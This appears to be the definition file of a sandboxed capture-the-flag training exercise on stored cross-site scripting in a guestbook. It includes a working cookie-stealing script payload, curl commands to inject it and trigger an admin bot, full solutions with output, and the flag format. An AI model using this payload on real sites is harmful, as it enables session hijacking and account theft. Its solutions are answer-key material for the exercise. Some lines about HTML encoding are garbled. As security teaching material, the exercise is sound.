title: Stored XSS — Cookie Theft
description: Discover a stored cross-site scripting vulnerability in a company guestbook, craft a cookie-stealing payload, trigger the admin bot, and retrieve the exfiltrated session token.
outcomes: Understand why unsanitised HTML output in web applications creates XSS vulnerabilities.
Distinguish between reflected and stored XSS and explain why stored XSS is more dangerous.
Craft a JavaScript payload that exfiltrates the victim's cookies to an attacker-controlled endpoint.
Trace the full cookie-theft chain: inject → victim visits → data collected → session hijacked.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Each level builds on the previous one. Do not skip ahead.
* If you get stuck, use the hints — or search for the technique online.
* This exercise is for educational purposes only. Only attack systems within your sandbox.

# Storyline

You are a junior penetration tester at SecureWave Ltd. Your client, NovaTech, runs a simple employee guestbook on their intranet. They believe it is harmless — 'just a message board', the developer told you.

Your job is to prove otherwise. An admin account visits the guestbook regularly. If you can inject JavaScript into a message, it will execute in the admin's browser — with access to the admin's session cookie. Steal the cookie and you have the flag.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.31.23**, then reach the target guestbook:

```
curl http://10.1.31.10/guestbook.php
```

The target server is at **10.1.31.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
The target web application is running locally:

```
curl http://127.0.0.1/guestbook.php
```

Or open http://127.0.0.1/guestbook.php in a browser. Submit **start** to begin.

levels.title: Confirm the XSS Vulnerability
levels.content:
You have found NovaTech's guestbook at `/guestbook.php`. Your first job is to confirm the page does not sanitise user input.

The classic XSS probe is to post a message containing a `<script>` tag:

```
curl -X POST \
  --data-urlencode "name=tester" \
  --data-urlencode "message=<script>alert(1)</script>" \
  http://10.1.31.10/guestbook.php
```

Then fetch the guestbook page and look at the raw HTML:

```
curl -s http://10.1.31.10/guestbook.php
```

If the application is vulnerable, your `<script>` tag will appear **unencoded** in the HTML source. A safe application would have converted `<` to `<` and `>` to `>`, making the tag harmless. If you see the raw tag, the browser would execute whatever JavaScript is inside it.

**What HTML tag type appears raw (unencoded) in the guestbook response, confirming the XSS vulnerability?**
levels.solution:
```
$ curl -X POST \
    --data-urlencode "name=tester" \
    --data-urlencode "message=<script>alert(1)</script>" \
    http://10.1.31.10/guestbook.php

$ curl -s http://10.1.31.10/guestbook.php | grep script
  <script>alert(1)</script>
```

The `<script>` tag appears unencoded in the response. The answer is **script**.

hints.title: What does a safe application do with HTML characters?
hints.content: A safe application would call `htmlspecialchars()` (PHP) or an equivalent to convert `<` to `<` and `>` to `>`. If those characters appear RAW in the HTML source, the browser interprets them as markup — making XSS possible.

hints.title: How do I see the raw HTML?
hints.content: Run `curl -s http://10.1.31.10/guestbook.php` and look for your injected text in the output. If you see `<script>alert(1)</script>` literally (not `<script>`), the tag is being reflected without encoding.

levels.title: Craft the Cookie-Stealing Payload
levels.content:
You have confirmed the guestbook reflects `<script>` tags unencoded. Now craft a payload that actually steals cookies.

When JavaScript runs in a victim's browser, it can access `document.cookie` — the cookies for that domain. A classic XSS exfiltration payload redirects the victim to an attacker-controlled URL with the cookie value appended:

```javascript
<script>document.location='/collect.php?data='+document.cookie</script>
```

This payload does two things:
1. Reads the victim's cookies with `document.cookie`.
2. Redirects the victim's browser to `/collect.php?data=<their cookies>`, which records the data server-side.

Post this payload to the guestbook:

```
curl -X POST \
  --data-urlencode "name=attacker" \
  --data-urlencode "message=<script>document.location='/collect.php?data='+document.cookie</script>" \
  http://10.1.31.10/guestbook.php
```

Now trigger the admin bot to visit the page:

```
curl -s http://10.1.31.10/bot.php
```

Read the bot response carefully — it tells you whether the XSS payload fired.

**What is the name of the PHP file that serves as the collection endpoint for stolen cookie data?**
levels.solution:
```
$ curl -X POST \
    --data-urlencode "name=attacker" \
    --data-urlencode "message=<script>document.location='/collect.php?data='+document.cookie</script>" \
    http://10.1.31.10/guestbook.php

$ curl -s http://10.1.31.10/bot.php
Admin bot visited the guestbook.
An XSS payload targeting /collect.php was detected and fired.
The admin session cookie has been exfiltrated to the collector.
```

The collection endpoint is **collect.php**.

hints.title: What does document.cookie contain?
hints.content: `document.cookie` is a JavaScript property that returns all non-HttpOnly cookies for the current domain as a string — for example `admin_session=abc123; theme=dark`. XSS can read this and send it anywhere.

hints.title: What does document.location do?
hints.content: Assigning to `document.location` redirects the victim's browser to the given URL. By appending `document.cookie` to the URL, the cookie value is sent as a GET parameter to the attacker's server.

hints.title: Why do I need to trigger bot.php?
hints.content: The XSS only executes when a victim visits the page. `bot.php` simulates the admin account visiting the guestbook — that is when the stored payload fires and the admin's cookie is sent to the collector.

levels.title: Retrieve the Flag
levels.content:
The admin bot visited the guestbook and your payload fired. The admin's session cookie has been sent to `/collect.php`.

Now read the collected data:

```
curl -s http://10.1.31.10/collect.php
```

The collector returns everything that was exfiltrated — including the admin's session cookie, which contains the flag.

In a real attack, this session token could be pasted into a browser's developer tools to impersonate the admin without knowing their password. This is called **session hijacking**.

**Submit the flag from the collected cookie data.**

hints.title: Where does the collected data go?
hints.content: The collection endpoint `/collect.php` stores incoming data server-side. Fetching it with a plain GET (no parameters) returns everything recorded so far.

hints.title: What format is the flag?
hints.content: The flag starts with `WMG{` and ends with `}`. It is embedded in the admin session cookie value.

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve the game.

questions.text: How difficult did you find this game?
Before this game, had you heard of cross-site scripting (XSS)?

choices.text: Yes, I knew how to exploit it
I had heard of it but not tried it

questions.text: How clear were the level instructions?
What would you change or add to improve this game?
